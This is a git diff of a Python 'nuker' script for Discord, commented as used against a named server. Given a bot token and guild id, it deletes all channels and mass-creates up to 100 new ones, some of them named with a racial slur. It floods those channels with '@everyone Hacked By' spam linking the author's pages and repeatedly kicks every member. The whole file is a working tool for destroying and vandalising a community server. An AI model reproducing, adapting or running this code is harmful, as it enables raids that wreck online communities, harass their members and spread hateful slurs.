@@ -1,4 +1,7 @@
+# Nuker used in GloabalMC
 from os import system
+
+
 def print_logo():
     system("cls || clear")
     print("""
@@ -7,34 +10,32 @@ def print_logo():
     |  \| | | | | |/ / _ \ '__|
     | |\  | |_| |   <  __/ |   
     |_| \_|\__,_|_|\_\___|_|   
-                                                       
+
         Made by Milkthedev
     """)
+
+
 print_logo()
-try: 
+try:
     import requests
     import time
     import threading
     import random
-    import discord
-    from discord.ext import commands
 except:
-    
+
     print("Required modules not found, installing them...")
     system("python -m pip install requests")
     system("python -m pip install discord")
     print("All modules installed, please restart the script.")
     input("Press enter to restart...")
 print_logo()
-# All parameters 
-TOKEN = input("Please enter bot token: ")
-LINK = 'https://YouTube.com/@SpigotRCE'
-COMMAND_PREFIX = '!'
+# All parameters
+LINK = 'https://tenor.com/view/milk-and-mocha-hug-cute-kawaii-love-gif-15160908 https://YouTube.com/@SpigotRCE https://discord.gg/spigotrce'
 MESSAGES = [
-    '@everyone Hacked By ' +LINK,
-    '@everyone Fucked By ' +LINK,
-    '@everyone Owned By '  +LINK,
-    '@everyone Nuked By '   +LINK
+    '@everyone Hacked By ' + LINK,
+    '@everyone Fucked By ' + LINK,
+    '@everyone Owned By ' + LINK,
+    '@everyone Nuked By ' + LINK
 ]
 CHANNEL_NAMES = [
     'Hacked',
@@ -43,9 +44,7 @@ CHANNEL_NAMES = [
     'Nigger'
 ]
 GUILD = int(input("Enter guild id: "))
-
-
-
+TOKEN = input("Enter token: ")
 headers = {'authorization': f'Bot {TOKEN}'}
 
 
@@ -60,8 +59,30 @@ def get_all_channels():
             else:
                 return
 
+
+def get_all_members():
+    members = []
+    url = f'https://discord.com/api/v10/guilds/{GUILD}/members?limit=1000'
+
+    while True:
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            members_data = response.json()
+            members.extend(members_data)
+            if 'next' in response.json():
+                url = response.json()['next']
+            else:
+                break
+        elif response.status_code == 429:
+            time.sleep(int(response.headers.get('Retry-After', 1)))
+        else:
+            print(f"Failed to fetch members. Status code: {response.status_code}")
+            return None
+
+    return members
+
+
 def remove_channel(chnl):
-    strike = 0
     while True:
         r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers)
         if 'retry_after' in r.text:
@@ -70,13 +91,8 @@ def remove_channel(chnl):
             if r.status_code in [200, 201, 204]:
                 print(f"[Success] Removed channel: {chnl}")
                 return
-            else:
-                print(f"[Fail] Cannot remove channel. Status: {r.status_code}. Retrying... Current strike: {strike}")
-                strike+=1
-                if strike > 3:
-                    print("[Srike] Strike limit has been reached. Quiting thread.")
-                    return
-    
+
+
 def channel(name):
     while True:
         json = {'name': name, 'type': 0}
@@ -86,76 +102,48 @@ def channel(name):
         else:
             if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                 id = r.json()["id"]
-                print(f"[Success] Created a channel with name: {name} ID: {id}")
+                print(f"[Success] Created channel: {id}")
                 threading.Thread(target=send_message, args=(id,)).start()
                 return
             else:
                 continue
+
+
 def send_message(id):
     while True:
         json = {'content': random.choice(MESSAGES)}
         r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json)
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
-def kick_member(id):
-    r = requests.delete(f'https://discord.com/api/v10/guilds/{GUILD}/members/{id}', headers=headers)
 
-# Check if the request was successful
-    if r.status_code == 204:
-        print(f'[Success] Kicked {id} successfully!')
-    else:
-        print(f'Failed to kick member. Status code: {r.status_code}, Response: {r.text}')
+
+def kick_member(id):
+    while True:
+        url = f'https://discord.com/api/v10/guilds/{GUILD}/members/{id}'
+        response = requests.delete(url, headers=headers)
+
+        if response.status_code == 204:
+            print(f"Successfully kicked member: {id}")
+            return
+
 
 def remove_channels():
     for channel_id in channel_ids:
         threading.Thread(target=remove_channel, args=(channel_id,)).start()
-        print("[Thread] Created thread for removing channels")
 
-def spam_channels(CHANNEL_NAME):
-    for i in range(20):
-        channel(f"{CHANNEL_NAME}")
 
+def remove_members():
+    time.sleep(2)
+    while True:
+        for profile in get_all_members():
+            threading.Thread(target=kick_member, args=(profile['user']['id'],)).start()
+
+
+threading.Thread(target=remove_members).start()
 channel_ids = [channel['id'] for channel in get_all_channels()]
 if len(channel_ids) != 0:
     remove_channels()
 else:
     print("No channels found.")
-for _ in range(50):
+for _ in range(100):
     threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
-    print("[Thread] Created thread for creating channels")
-
-
-def kick():
-    intents = discord.Intents.all()
-    intents.members = True
-
-    bot = commands.Bot(command_prefix='!', intents=intents)
-    @bot.event
-    async def on_ready():
-        print(f'Logged in as {bot.user.name}')
-        await kick_all_members()
-
-    async def kick_all_members():
-        i = 0
-        k = 0
-        guild_id = GUILD  # Replace with your actual guild ID
-        guild = bot.get_guild(guild_id)
-        if guild:
-            for member in guild.members:
-                try:
-                    
-                    await member.kick(reason="Kicked all members")
-                    print(f'[Success] Kicked: {member.name}#{member.discriminator}')
-                    i += 1
-                except discord.Forbidden:
-                    k += 1
-                    print(f'[Fail] Can\'t kick: {member.name}#{member.discriminator} (Permission Denied)')
-            print(f"[Info] Member kick loop finished, kicked: {i}, failed: {k}, total: {i+k}")
-        else:
-            print(f'Guild not found.')
-
-
-    bot.run(TOKEN)
-
-time.sleep(5)
-kick()
